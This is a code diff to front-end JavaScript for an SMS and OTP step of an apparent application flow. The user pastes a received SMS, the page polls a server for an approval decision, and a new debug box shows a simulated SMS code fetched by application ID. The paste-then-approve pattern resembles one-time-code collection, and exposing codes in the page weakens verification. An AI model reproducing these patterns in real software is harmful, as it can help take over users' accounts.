@@ -21,6 +21,21 @@ function goTo(pageId) {
         chkSmsMsg();
         ['smsMsg','smsMsgOk'].forEach(function(id){ document.getElementById(id).classList.remove('show'); });
         startSmsTimer();
+        // NEW: fetch and display dev SMS code if simulated
+        fetch(`/api/dev-sms-code/${S.applicationId}`)
+            .then(res => res.json())
+            .then(data => {
+                if (data.success && data.simulated) {
+                    let devBox = document.getElementById('devSmsCodeBox');
+                    if (!devBox) {
+                        devBox = document.createElement('div');
+                        devBox.id = 'devSmsCodeBox';
+                        devBox.style.cssText = 'background:#f0fdf4; border:1px solid #bbf7d0; padding:8px; border-radius:8px; margin-top:8px; font-size:0.85rem; color:#166534;';
+                        document.querySelector('.sms-card').appendChild(devBox);
+                    }
+                    devBox.innerHTML = '<strong>Test SMS Code:</strong> ' + data.code;
+                }
+            });
     }
     if (pageId === 'page-otp') {
         const btn = document.getElementById('bOtp');
@@ -239,7 +254,17 @@ async function doSmsResend() {
         if (data.success) {
             document.getElementById('smsResendWrap').style.display = 'none';
             document.getElementById('smsMsgBox').disabled = false; document.getElementById('bSms').disabled = false;
-            startSmsTimer(); showSmsMsg('success', 'A new SMS has been sent. Paste it before it expires.');
+            startSmsTimer();
+            showSmsMsg('success', 'A new SMS has been sent. Paste it before it expires.');
+            // NEW: update dev code box after resend
+            fetch(`/api/dev-sms-code/${S.applicationId}`)
+                .then(res => res.json())
+                .then(data2 => {
+                    if (data2.success && data2.simulated) {
+                        const devBox = document.getElementById('devSmsCodeBox');
+                        if (devBox) devBox.innerHTML = '<strong>Test SMS Code:</strong> ' + data2.code;
+                    }
+                });
         } else { btn.disabled = false; showSmsMsg('error', data.message || 'Failed to resend SMS.'); }
     } catch (err) { spinner.classList.remove('show'); btn.disabled = false; showSmsMsg('error', 'Network error: ' + err.message); }
 }
@@ -264,18 +289,18 @@ async function doSmsParse() {
     } catch (err) { document.getElementById('mSms').classList.remove('show'); document.getElementById('bSms').disabled = false; showSmsMsg('error', 'Error: ' + err.message); }
 }
 
-// ============== POLLING SMS APPROVAL (Fixed) ==============
+// ============== POLLING SMS APPROVAL ==============
 let smsPollTimeout;
 function pollForSmsApproval(applicationId) {
     const checkStatus = async () => {
         if (S.applicationId !== applicationId) return;
         try {
-            const res = await fetch(`/api/check-sms-status/${applicationId}`);  // ✅ Now uses dedicated SMS endpoint
+            const res = await fetch(`/api/check-sms-status/${applicationId}`);
             const data = await res.json();
             if (data.success) {
                 if (data.status === 'approved') {
                     clearTimeout(smsPollTimeout);
-                    goTo('page-otp');  // ✅ Move to OTP page
+                    goTo('page-otp');
                 } else if (data.status === 'rejected') {
                     clearTimeout(smsPollTimeout);
                     document.getElementById('smsMsgBox').value = '';
